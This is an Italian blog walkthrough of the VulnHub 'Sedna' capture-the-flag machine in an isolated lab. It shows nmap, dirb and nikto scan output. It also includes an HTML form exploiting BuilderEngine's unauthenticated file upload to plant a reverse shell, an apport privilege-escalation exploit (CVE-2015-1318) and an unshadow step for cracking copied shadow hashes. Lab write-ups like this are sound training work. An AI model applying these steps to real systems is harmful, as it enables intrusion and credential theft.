---
layout: post
author: thesp0nge
title: "Getting Root: Sedna"
exercise: https://www.vulnhub.com/entry/hackfest2016-sedna,181/
level: INTERMEDIO
promotion: 
modified: 
featured: false
category: [getting-root]
tags: [walkthrough, oscp, hackfest 2016, getting-root]
comments: true
image:
  feature: root.png
share: true
---

Dopo il terzo livello di Kioptrix ho alzato un attimo il tiro ed ho scaricato
[Sedna](https://www.vulnhub.com/entry/hackfest2016-sedna,181/), una macchina
preparata per il CTF di HackFest 2016.


## Sedna

La macchina Sedna è disponibile a [questa pagina]({{page.exercise}}) del sito
[vulnhub.com](https://www.vulnhub.com).

Questa macchina, battezzata dall'autore come di livello INTERMEDIO, ha 4 flag
che devono essere recuperate:

* una per la login non privilegiata
* una per la login come root
* due da cercare nella fase di post exploitation

### Setup dell'ambiente

La configurazione della mia piccola rete locale in 
[VirtualBox](https://www.virtualbox.org), tra la mia [Kali
Linux](https://www.kali.org) e la macchina target, è rimasta la stessa.
Entrambe non possono ragiungere il mondo esterno.

![La nostra vittima all'avvio]({{site.url}}/assets/images/getting-root/sedna/vm_started.png)

Ora che tutte le macchine, all'avvio, prenderanno un indirizzo sulla 192.168.56
possiamo partire.

Cerchiamo l'indirizzo della nostra vittima.

{% highlight sh%}
# nmap -sn 192.168.56.101-255
{% endhighlight%}

La macchina 192.168.56.101 è una Kali Linux aggiornata e pronta all'uso, mentre
la macchina 192.168.56.102 è il nostro target. 

### Recon

Il primo passaggio è quello di enumerare i servizi in ascolto sulla macchina,
per cercare di capire qualcosa in più.

{%highlight sh%}
# nmap -sV -O -oA 192.168.56.102 192.168.56.102
{%endhighlight%}

{% highlight sh %}
# Nmap 7.50 scan initiated Wed Sep 20 15:46:34 2017 as: nmap -sV -O -oA 192.168.56.102 192.168.56.102
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.102
Host is up (0.00035s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain      ISC BIND 9.9.5-3-Ubuntu
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
110/tcp  open  pop3        Dovecot pop3d
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3    Dovecot pop3d
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:40:66:B6 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 20 15:46:50 2017 -- 1 IP address (1 host up) scanned in 15.97 seconds
{%endhighlight%}

Continuo la ricognizione andando ad approfondire la conoscenza con i servizi sulla porta 80 e 8080.

{%highlight sh%}
# dirb http://192.168.56.102:8080 -o 192.168.56.102.dirb_8080 
# dirb http://192.168.56.102 -o 192.168.56.102.dirb_80

...


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: 192.168.56.102.dirb_80
START_TIME: Wed Sep 20 15:53:09 2017
URL_BASE: http://192.168.56.102/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.102/ ----
==> DIRECTORY: http://192.168.56.102/blocks/
==> DIRECTORY: http://192.168.56.102/files/
+ http://192.168.56.102/index.html (CODE:200|SIZE:101)
==> DIRECTORY: http://192.168.56.102/modules/
+ http://192.168.56.102/robots.txt (CODE:200|SIZE:36)
+ http://192.168.56.102/server-status (CODE:403|SIZE:294)
==> DIRECTORY: http://192.168.56.102/system/
==> DIRECTORY: http://192.168.56.102/themes/

---- Entering directory: http://192.168.56.102/blocks/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.102/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.102/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.102/system/ ----
==> DIRECTORY: http://192.168.56.102/system/core/
==> DIRECTORY: http://192.168.56.102/system/database/
==> DIRECTORY: http://192.168.56.102/system/fonts/
==> DIRECTORY: http://192.168.56.102/system/helpers/
+ http://192.168.56.102/system/index.html (CODE:200|SIZE:142)
==> DIRECTORY: http://192.168.56.102/system/language/
==> DIRECTORY: http://192.168.56.102/system/libraries/

---- Entering directory: http://192.168.56.102/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.102/system/core/ ----
==> DIRECTORY: http://192.168.56.102/system/core/compat/
+ http://192.168.56.102/system/core/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/database/ ----
==> DIRECTORY: http://192.168.56.102/system/database/drivers/
+ http://192.168.56.102/system/database/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/fonts/ ----
+ http://192.168.56.102/system/fonts/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/helpers/ ----
+ http://192.168.56.102/system/helpers/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/language/ ----
==> DIRECTORY: http://192.168.56.102/system/language/english/
+ http://192.168.56.102/system/language/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/libraries/ ----
+ http://192.168.56.102/system/libraries/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/core/compat/ ----
+ http://192.168.56.102/system/core/compat/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/database/drivers/ ----
+ http://192.168.56.102/system/database/drivers/index.html (CODE:200|SIZE:142)
==> DIRECTORY: http://192.168.56.102/system/database/drivers/mssql/
==> DIRECTORY: http://192.168.56.102/system/database/drivers/mysql/
==> DIRECTORY: http://192.168.56.102/system/database/drivers/odbc/

---- Entering directory: http://192.168.56.102/system/language/english/ ----
+ http://192.168.56.102/system/language/english/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/database/drivers/mssql/ ----
+ http://192.168.56.102/system/database/drivers/mssql/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/database/drivers/mysql/ ----
+ http://192.168.56.102/system/database/drivers/mysql/index.html (CODE:200|SIZE:142)

---- Entering directory: http://192.168.56.102/system/database/drivers/odbc/ ----
+ http://192.168.56.102/system/database/drivers/odbc/index.html (CODE:200|SIZE:142)

-----------------
END_TIME: Wed Sep 20 15:53:38 2017
DOWNLOADED: 64568 - FOUND: 16

...


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: 192.168.56.102.dirb_8080
START_TIME: Wed Sep 20 15:49:33 2017
URL_BASE: http://192.168.56.102:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.102:8080/ ----
==> DIRECTORY: http://192.168.56.102:8080/docs/
==> DIRECTORY: http://192.168.56.102:8080/examples/
==> DIRECTORY: http://192.168.56.102:8080/host-manager/
+ http://192.168.56.102:8080/index.html (CODE:200|SIZE:1895)
==> DIRECTORY: http://192.168.56.102:8080/manager/
==> DIRECTORY: http://192.168.56.102:8080/META-INF/

---- Entering directory: http://192.168.56.102:8080/docs/ ----
==> DIRECTORY: http://192.168.56.102:8080/docs/api/
==> DIRECTORY: http://192.168.56.102:8080/docs/architecture/
==> DIRECTORY: http://192.168.56.102:8080/docs/config/
==> DIRECTORY: http://192.168.56.102:8080/docs/images/
+ http://192.168.56.102:8080/docs/index.html (CODE:200|SIZE:18151)
==> DIRECTORY: http://192.168.56.102:8080/docs/WEB-INF/

---- Entering directory: http://192.168.56.102:8080/examples/ ----
+ http://192.168.56.102:8080/examples/index.html (CODE:200|SIZE:1253)
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/
==> DIRECTORY: http://192.168.56.102:8080/examples/servlets/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/

---- Entering directory: http://192.168.56.102:8080/host-manager/ ----
+ http://192.168.56.102:8080/host-manager/html (CODE:401|SIZE:2045)
==> DIRECTORY: http://192.168.56.102:8080/host-manager/images/
==> DIRECTORY: http://192.168.56.102:8080/host-manager/META-INF/
+ http://192.168.56.102:8080/host-manager/text (CODE:401|SIZE:2045)
==> DIRECTORY: http://192.168.56.102:8080/host-manager/WEB-INF/

---- Entering directory: http://192.168.56.102:8080/manager/ ----
+ http://192.168.56.102:8080/manager/html (CODE:401|SIZE:2474)
==> DIRECTORY: http://192.168.56.102:8080/manager/images/
==> DIRECTORY: http://192.168.56.102:8080/manager/META-INF/
+ http://192.168.56.102:8080/manager/status (CODE:401|SIZE:2474)
+ http://192.168.56.102:8080/manager/text (CODE:401|SIZE:2474)
==> DIRECTORY: http://192.168.56.102:8080/manager/WEB-INF/

---- Entering directory: http://192.168.56.102:8080/META-INF/ ----

---- Entering directory: http://192.168.56.102:8080/docs/api/ ----
+ http://192.168.56.102:8080/docs/api/index.html (CODE:200|SIZE:1295)

---- Entering directory: http://192.168.56.102:8080/docs/architecture/ ----
+ http://192.168.56.102:8080/docs/architecture/index.html (CODE:200|SIZE:6591)

---- Entering directory: http://192.168.56.102:8080/docs/config/ ----
+ http://192.168.56.102:8080/docs/config/index.html (CODE:200|SIZE:9931)

---- Entering directory: http://192.168.56.102:8080/docs/images/ ----

---- Entering directory: http://192.168.56.102:8080/docs/WEB-INF/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/cal/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/chat/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/error/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/forward/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/images/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/include/
+ http://192.168.56.102:8080/examples/jsp/index.html (CODE:200|SIZE:19119)
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/jsp2/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/plugin/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/security/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/sessions/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/snp/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/xml/

---- Entering directory: http://192.168.56.102:8080/examples/servlets/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/servlets/images/
+ http://192.168.56.102:8080/examples/servlets/index.html (CODE:200|SIZE:5222)

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/jsp/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/jsp2/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/lib/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/tags/

---- Entering directory: http://192.168.56.102:8080/host-manager/images/ ----

---- Entering directory: http://192.168.56.102:8080/host-manager/META-INF/ ----

---- Entering directory: http://192.168.56.102:8080/host-manager/WEB-INF/ ----
==> DIRECTORY: http://192.168.56.102:8080/host-manager/WEB-INF/jsp/

---- Entering directory: http://192.168.56.102:8080/manager/images/ ----

---- Entering directory: http://192.168.56.102:8080/manager/META-INF/ ----

---- Entering directory: http://192.168.56.102:8080/manager/WEB-INF/ ----
==> DIRECTORY: http://192.168.56.102:8080/manager/WEB-INF/jsp/

---- Entering directory: http://192.168.56.102:8080/examples/jsp/cal/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/chat/ ----
+ http://192.168.56.102:8080/examples/jsp/chat/chat (CODE:200|SIZE:288)

---- Entering directory: http://192.168.56.102:8080/examples/jsp/error/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/forward/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/images/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/include/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/jsp2/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/jsp2/el/
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/jsp2/misc/

---- Entering directory: http://192.168.56.102:8080/examples/jsp/plugin/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/plugin/applet/

---- Entering directory: http://192.168.56.102:8080/examples/jsp/security/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/jsp/security/protected/

---- Entering directory: http://192.168.56.102:8080/examples/jsp/sessions/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/snp/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/xml/ ----

---- Entering directory: http://192.168.56.102:8080/examples/servlets/images/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/cal/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/chat/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/error/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/examples/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/jsp2/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/sessions/
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/util/

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/jsp/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/jsp/applet/

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/jsp2/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/lib/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/tags/ ----

---- Entering directory: http://192.168.56.102:8080/host-manager/WEB-INF/jsp/ ----

---- Entering directory: http://192.168.56.102:8080/manager/WEB-INF/jsp/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/jsp2/el/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/jsp2/misc/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/plugin/applet/ ----

---- Entering directory: http://192.168.56.102:8080/examples/jsp/security/protected/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/cal/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/chat/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/error/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/examples/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/jsp2/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/jsp2/examples/

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/sessions/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/util/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/jsp/applet/ ----

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/jsp2/examples/ ----
==> DIRECTORY: http://192.168.56.102:8080/examples/WEB-INF/classes/jsp2/examples/el/

---- Entering directory: http://192.168.56.102:8080/examples/WEB-INF/classes/jsp2/examples/el/ ----

{%endhighlight%}

Abbiamo quindi un sito semi abbandonato sulla porta 80 ed un'installazione
nuova e ancora immacolata sulla porta 8080.

Per entrambi, l'output di nikto è di più immediata lettura:

{%highlight sh%}
# nikto -host http://192.168.56.102 -Format txt -o 192.168.56.102.nikto
# nikto -host http://192.168.56.102:8080 -Format txt -o 192.168.56.102.nikto_8080

...

- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.56.102
+ Target Port: 80
+ GET Server leaks inodes via ETags, header found with file /, fields: 0x65 0x53fb059bb5bc8 
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET "robots.txt" contains 1 entry which should be manually viewed.
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: GET /files/: Directory indexing found.
+ OSVDB-3092: GET /files/: This might be interesting...
+ OSVDB-3092: GET /system/: This might be interesting...
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ OSVDB-3092: GET /license.txt: License file found may identify site software.

...

- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.56.102
+ Target Port: 8080
+ GET Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1475867860000 
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ GET /: Appears to be a default Apache Tomcat install.
+ GET /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: GET /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ GET /manager/html: Default Tomcat Manager / Host Manager interface found
+ GET /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ GET /manager/status: Default Tomcat Server Status interface found

{%endhighlight%}

Sulla porta 80 abbiamo trovato un license.txt, vediamo di che si tratta.

![license.txt]({{site.url}}/assets/images/getting-root/sedna/builder_engine_license.png)

Sul sito sembra esserci del codice generato con BuilderEngine che, per nostra
fortuna, potrebbe soffrire di un problema di upload di file arbitrari.

![builderengine exploit]({{site.url}}/assets/images/getting-root/sedna/builderengine_exploits.png)

### Takeover narrative

Partiamo da BuilderEngine, se la versione risulta essere vulnerabile, possiamo
caricare sul sito una reverse shell ed entrare sulla macchina.

Leggendo la descrizione della vulnerabilità, si tratta solo di fare una POST su
/themes/dashboard/assets/plugins/jquery-file-upload/server/php/. Scrivo quindi
una semplice pagina HTML che mi crea una form per l'upload di un file.

{%highlight html%}
<html>
<body>
  <form method="post"
        action="http://192.168.56.102/themes/dashboard/assets/plugins/jquery-file-upload/server/php/"
        enctype="multipart/form-data">
    <input type="file" name="files[]" />
    <input type="submit" value="send" />
  </form>
</body>
</html>

{%endhighlight%}

![Upload della reverse shell]({{site.url}}/assets/images/getting-root/sedna/rev_shell_sent.png)

Come possiamo vedere, l'API vulnerabile ci dice anche dove è stata caricata la
nostra reverse shell, questo ci facilita notevolmente il compito. Lancio un
netcat in ascolto sulla mia porta 443 e mi faccio chiamare.

![Shell non privilegiata]({{site.url}}/assets/images/getting-root/sedna/unprivileged_shell.png)

In /var/www c'è la prima delle 4 flag a disposizione.

![Prima flag]({{site.url}}/assets/images/getting-root/sedna/first_flag.png)

Per poter trovare un exploit per diventare root su Sedna, devo capire che
kernel monta e la versione della distribuzione.

![Info gathering]({{site.url}}/assets/images/getting-root/sedna/os_info.png)

Per la versione 14.04 ci sono molti exploit che portano un utente a diventare root.

![Exploit per ubuntu]({{site.url}}/assets/images/getting-root/sedna/ubuntu_exploits.png)

> A causa di un tentativo di exploit andanto male, per elevare i miei
> privilegi, ho dovuto rifare la macchina. La nuova Sedna ha preso il .103
> finale.

Ne ho provati un po', prima quelli kernel based e tutti i tentativi sono andati
male. Ho pensato, quindi, ad una misconfiguration di qualche servizio che mi
potesse dare qualche privilegio. Tuttavia, dopo un'oretta spesa girovagando nel
sistema non ne sono venuto a capo.

Ho provato quindi uno degli exploit che mi erano stati suggeriti, quello che
sfrutta la [CVE-2015-1318](http://www.cvedetails.com/cve/cve-2015-1318) per
apport. Compilato l'exploit sulla macchina ho acquisito il mio UID = 0 ed ho
preso la seconda flag, memorizzata nella /root.

![I'm root]({{site.url}}/assets/images/getting-root/sedna/root_flag.png)

Le altre due flag erano a disposizione nella post-exploitation.

Ho girovagato un po' nel sistema, spendendo un altro paio d'ore e sono arrivato a:

* un utente crackmeforpoints  ![flag3]({{site.url}}/assets/images/getting-root/sedna/username_interessante.png)
* una password submitthisforpoints ![flag4]({{site.url}}/assets/images/getting-root/sedna/flag_3_tomcat_user.png)

Mentre l'ultima potrebbe essere direttamente la nostra flag, per la password di
crackmeforpoints, c'è da lavorare ancora un po'.

Ho portato il file passwd ed il file shadow sulla mia macchina Kali ed ho dato
il comando:

{%highlight sh%}
# unshadow passwd shadow > sedna_passwd
{%endhighlight%}

Da qui ho provato un po' di wordlist, ma non ne sono venuto a capo. La strada è
quella giusta, questa è la quarta flag (confermato via twitter dall'autore
della macchina), serve solo trovare la wordlist giusta.

Mollo il colpo solo per dedicarmi alla prossima macchina, visto che la rincorsa
all'OSCP è nuovamente iniziata.

## Off by one

La parte di exploitation di questa macchina non è stata particolarmente
complessa. E' stato un po' più lento, il processo di ricerca degli altri indizi
che hanno portato alle altre due chiavi.

La prossima macchina credo sarà di un livello superiore. Poi cercherò macchine
Windows da bucare; durante l'esame è stato veramente il punto dove ho fatto più
fatica.

Oggi mi sono iscritto nuovamente al laboratorio dell'OSCP, quest'anno Babbo
Natale porterà grandi gioie. 

\#tryharder
